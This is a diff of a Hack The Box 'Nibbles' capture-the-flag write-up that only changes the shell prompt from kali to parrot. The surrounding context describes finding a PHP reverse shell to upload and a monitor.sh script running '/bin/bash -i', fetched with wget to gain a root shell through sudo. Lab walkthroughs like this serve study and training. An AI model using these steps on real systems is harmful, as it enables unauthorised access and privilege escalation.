@@ -27,7 +27,7 @@ some digging and found this link from [wikihack](https://wikihak.com/how-to-uplo
 
 okey let find our shell on kali
 ```console
-kali@kali:/opt$ sudo find / -name php-reverse* 2> /dev/null
+bibo318@parrot:/opt$ sudo find / -name php-reverse* 2> /dev/null
 /usr/share/webshells/php/php-reverse-shell.php
 ```
 copy it and modify ip and port
@@ -65,7 +65,7 @@ User nibbler may run the following commands on Nibbles:
 ```
 since I cant use `vi` or `nano` I decided to create the monitor.sh on my kali and run python webserver then wget it on the victim server. here is the content of `monitor.sh` 
 ```console
-kali@kali:~/HTB/nibbles$ cat monitor.sh 
+bibo318@parrot:~/HTB/nibbles$ cat monitor.sh 
 #!/bin/sh
 /bin/bash -i
 ```
